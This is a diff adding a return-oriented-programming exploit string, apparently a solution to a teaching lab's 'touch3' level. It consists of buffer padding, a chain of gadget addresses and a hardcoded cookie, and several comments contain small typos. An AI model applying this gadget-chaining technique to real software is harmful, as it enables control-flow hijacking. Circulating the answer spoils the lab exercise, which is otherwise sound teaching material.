@@ -1,0 +1,22 @@
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00     /* totally 40 bytes above                                   */
+
+/* part1 : let %rdi = %rsp                                                              */
+06 1a 40 00 00 00 00 00     /* start address of "movq %rsp, %rax; retq"                 */
+a2 19 40 00 00 00 00 00     /* start address of "movq %rax, %rdi; retq"                 */
+
+/* part2 : let %rsi = offset between cookie and rsp                                     */
+cc 19 40 00 00 00 00 00     /* start address of "popq %rax; nop; retq"                  */
+48 00 00 00 00 00 00 00     /* offset between cookie and rsp                            */
+42 1a 40 00 00 00 00 00     /* start address of "movl %ead, %edx; testb %al, %al; retq" */
+69 1a 40 00 00 00 00 00     /* start address of "movl %edx, ecx; orb %bl, %bl; retq"    */
+13 1a 40 00 00 00 00 00     /* start address of "movl %ecx, %esi; nop; nop; retq"       */
+
+/* part3 : call func add_xy to get the address of cookie and move it to %rdi            */
+d6 19 40 00 00 00 00 00     /* start address of func add_xy                             */
+a2 19 40 00 00 00 00 00     /* start address of "movq %rax, %rdi; retq"                 */
+fa 18 40 00 00 00 00 00     /* start address of func touch3                             */
+35 39 62 39 39 37 66 61 00  /* store cookie: 59b997fa\0                                 */
